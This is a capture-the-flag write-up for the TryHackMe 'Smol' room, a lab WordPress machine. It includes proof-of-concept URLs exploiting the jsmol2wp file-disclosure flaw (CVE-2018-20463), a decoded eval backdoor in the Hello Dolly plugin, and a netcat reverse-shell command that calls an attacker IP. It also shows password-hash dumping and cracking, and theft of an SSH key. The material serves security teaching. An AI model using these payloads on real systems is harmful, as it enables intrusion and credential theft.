---
title: "TryHackMe: Smol"
categories: [TryHackMe]
tags: [web, cve, rce, mysql, lfi, wordpress]
render_with_liquid: false
media_subpath: /images/tryhackme_smol/
image:
  path: banner.png
---

Test your enumeration skills on this boot-to-root machine.

At the heart of **Smol** is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.

Quick Tips: Do you know that on computers without GPU like the AttackBox, **John The Ripper** is faster than **Hashcat**?

![](room_card.png){: width="300" height="300" .shadow}
_<https://tryhackme.com/r/room/smol>_


## Reconnaissance

We begin with an nmap scan, which reveals only two open ports: port 22 and port 80. On port 22, an SSH server is running, allowing for secure remote access. Meanwhile, port 80 hosts a web server, indicating a potential avenue for further investigation or interaction.

![](nmap.png){: width="1063" height="371"}

We mapped www.smol.thm in `/etc/hosts` file to enable local access to the site.

```console
echo "192.168.1.100 www.smol.thm" | sudo tee -a /etc/hosts
```
The page appears fairly plain with a few static links, but it actually provides everything needed to eventually achieve RCE. It includes sections on XSS, SSRF, and RCE, which turn out to be important later on.

![](main.png){: width="1876" height="723"}


## Enumeration

While looking through the site source code, we noticed signs that it’s running WordPress.

![](source_code.png){: width="1803" height="365"}

We ran a directory enumeration with feroxbuster to identify hidden endpoints that aren’t linked on the main site.

![](ferox.png){: width="1232" height="627"}

WPScan revealed details about the site’s WordPress setup, including the themes and plugins in use.

![](wpscan.png){: width="920" height="714"}

The output highlights that the [jsmol2wp v1.07](https://wpscan.com/plugin/jsmol2wp/) plugin is installed on the site.

![](jsmol2wp.png){: width="1452" height="525"}

During the vulnerability review for the plugin, `CVE‑2018‑20463` stands out, offering both SSRF and file‑disclosure impact. The PoC for this vulnerability is as follows:

```console
http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3Cscript%3Ealert(/xss/)%3C/script%3E&mimetype=text/html;%20charset=utf-8
```

## Exploiting LFI (Web Access)

Testing for vulnerability by making a request to:

```console
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```
With these two important details collected, the next step is to go to the wp-login page and sign in.

![](db_pass1.png){: width="1102" height="583"}

We're in the WP dashboard.

![](dashboard.png){: width="1908" height="735"}

## Shell as www-data

We're logged into the panel with lower level access, not as admin. Whilst browsing through the pages, we stumbled upon one called 'Webmaster Tasks'

![](webmaster_page.png){: width="1915" height="506"}

Opening the page shows a simple task list, but one entry immediately grabs the attention, it hints at a potential backdoor hidden inside the `Hello Dolly` plugin, the default plugin that comes bundled with WordPress.

![](wm_tasks.png){: width="743" height="723"}

![](hellodolly.png){: width="927" height="641"}

<div style="text-align: center; margin-top: 0; margin-bottom: 20px;">
  <a href="https://github.com/WordPress/hello-dolly" target="_blank">Hello Dolly Plugin</a>
</div>

The LFI vulnerability in `jsmol2wp` was used to load an internal file. The server returned the contents of `hello.php`, confirming that the LFI works as expected.

```console
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
```
The use of `eval` in this PHP code stands out right away, as it’s a well-known vector for executing arbitrary code. The Base64 encoding doesn’t really hide much, the command is still easy to spot.

![](base64.png){: width="1079" height="428"}

After decoding the Base64 string, this is the output we ended up with.

![](base64_decode.png){: width="1089" height="340"}


> This part checks if the `$_GET` array contains a parameter named `cmd`, but it is encoded in octal and hexadecimal:
> - `\143` (octal) is **"c"**
> - `\155` (octal) is **"m"**
> - `\x64` (hexadecimal) is **"d"**
> 
> So, `"\143\155\x64"` resolves to the string **"cmd"**. The code is essentially looking for the `cmd` parameter in the URL.
{: .prompt-info }

![](cyberchef.png){: width="1529" height="579"}


> The backdoor operates as follows:

1. **Base64 Decoding**: The system first decodes the Base64-encoded string, which reveals the hidden code.
2. **Code Execution**: The decoded code is then executed using the `eval` function.
3. **Command Execution**: The decoded code retrieves the `cmd` parameter from the GET request and executes its value using the `system` function.
{: .prompt-tip }

By leveraging this, we can execute the reverse shell payload with the following command, which can be triggered by visiting the URL :

```console
http://www.smol.thm/wp-admin/index.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.4.76.203%204444%20%3E%2Ftmp%2Ff
```
[Revshells](https://www.revshells.com/)

This will give us a shell running as the `www-data` user on our listener.

![](nc.png){: width="789" height="386"}

To make the reverse shell interactive, use the following Python command to spawn a pseudo-terminal:

![](stabilize_shell.png){: width="685" height="270"}

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm
export SHELL=/bin/bash
stty raw -echo
```

## Shell as diego

The WP creds we grabbed earlier also give us MySQL access. Using `mysql -u wpuser -p [REDACTED]`, we can use it to connect to the database.

![](mysql.png){: width="928" height="438"}

![](show_tables.png){: width="1167" height="796"}

```console
www-data@smol:/var/www/wordpress/wp-admin$ mysql -u wpuser -p [REDACTED] -D wordpress

mysql> select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. |
| wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. |
| think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ |
| gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 |
| diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 |
| xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 |
+------------+------------------------------------+
6 rows in set (0.00 sec)
```
Save it as hashes.txt

```console
admin:$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
think:$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
gege:$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1
diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
xavi:$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1
```
{: file="hashes.txt" }

During the process of cracking the hashes, we finally manage to uncover that the hash for the "diego" user resolves to [REDACTED].

![](pass2john.png){: width="859" height="217"}

## Retrieving user flag

The password isn't applicable for SSH, but we can leverage it with su to switch to the `diego` user. Once logged in, we can view the user flag at `/home/diego/user.txt`

![](user_flag.png){: width="744" height="439"}

## Shell as think

Upon inspecting the home directories of other users, we come across a private SSH key in the `think` user directory at `/home/think/.ssh/id_rsa`

We checked the permissions on the home directory and saw that the group internal has read access. Since our user diego is also a member of this internal group, we inherit that read permission. As a result, we are able to read the SSH key from `think`.

![](id_rsa1.png){: width="866" height="407"}

![](id_rsa2.png){: width="782" height="716"}

We save the key as `id_rsa` on our system, and then use it to make an `SSH` connection.

![](ssh.png){: width="896" height="607"}

## Shell as gege

While exploring the home directories, we noticed a zip file in `gege` folder, likely an old WordPress installation. It could contain useful information but only the user `gege` has permission to read it.

Fortunately, we can switch to the `gege` account directly using `su`. It works because of the configuration in `/etc/pam.d/su`

![](ls_users.png){: width="814" height="581"}

```console
think@smol:~$ su - gege
gege@smol:~$ id
uid=1003(gege) gid=1003(gege) groups=1003(gege),1004(dev),1005(internal)
```

## Shell as xavi

Unzipping `wordpress.old.zip` fails with an “incorrect password” message, so the archive is locked. Looking through other users directories shows the same file under `gege`, with nothing else useful around. 

![](unzip_denied.png){: width="989" height="330"}

Using a Python HTTP server on the target, the zip file was downloaded to the local machine. 

![](zip2john.png){: width="1898" height="380"}

The next step is to try cracking the ZIP password with John.

![](wordpress_pass.png){: width="960" height="203"}

![](unzip.png){: width="686" height="145"}

Inside the extracted archive, `wp-config.php` contains another set of database credentials: xavi:[REDACTED]

![](db_pass2.png){: width="1325" height="701"}

## Shell as root

The password works for `xavi`, so we switch to that user with `su`. With full sudo privileges, we can switch to root and read the flag at `/root/root.txt`, thus completing the room.

![](root_flag.png){: width="1050" height="276"}